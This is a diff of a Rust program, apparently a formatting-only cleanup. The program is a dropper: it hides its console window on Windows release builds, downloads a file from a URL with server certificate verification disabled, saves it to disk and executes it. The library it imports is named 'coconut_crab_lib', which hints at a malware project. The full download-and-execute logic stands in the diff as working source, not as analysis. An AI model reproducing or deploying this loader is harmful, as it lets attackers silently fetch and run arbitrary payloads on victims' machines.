@@ -1,6 +1,9 @@
-#![cfg_attr(all(target_os = "windows", not(debug_assertions)), windows_subsystem = "windows")]
+#![cfg_attr(
+    all(target_os = "windows", not(debug_assertions)),
+    windows_subsystem = "windows"
+)]
 
-use std::{ process::Command, io::Write, fs::File };
+use std::{fs::File, io::Write, process::Command};
 
 use coconut_crab_lib::web::client::web_get_recv_bytes;
 
@@ -28,13 +31,16 @@ const VERIFY_SERVER: bool = false;
 
 fn main() {
     {
-        let content = web_get_recv_bytes(&String::from(URL), &VERIFY_SERVER).expect(
-            "Unable to get content"
-        );
+        let content =
+            web_get_recv_bytes(&String::from(URL), &VERIFY_SERVER).expect("Unable to get content");
         let mut file = File::create(FILENAME).expect("Unable to open file");
-        file.write_all(&content).expect("Failed to write data to file");
-        file.sync_all().expect("Failed to complete file io operations");
+        file.write_all(&content)
+            .expect("Failed to write data to file");
+        file.sync_all()
+            .expect("Failed to complete file io operations");
     }
 
-    Command::new(format!("./{}", FILENAME)).output().expect("Failed to execute file");
+    Command::new(format!("./{}", FILENAME))
+        .output()
+        .expect("Failed to execute file");
 }
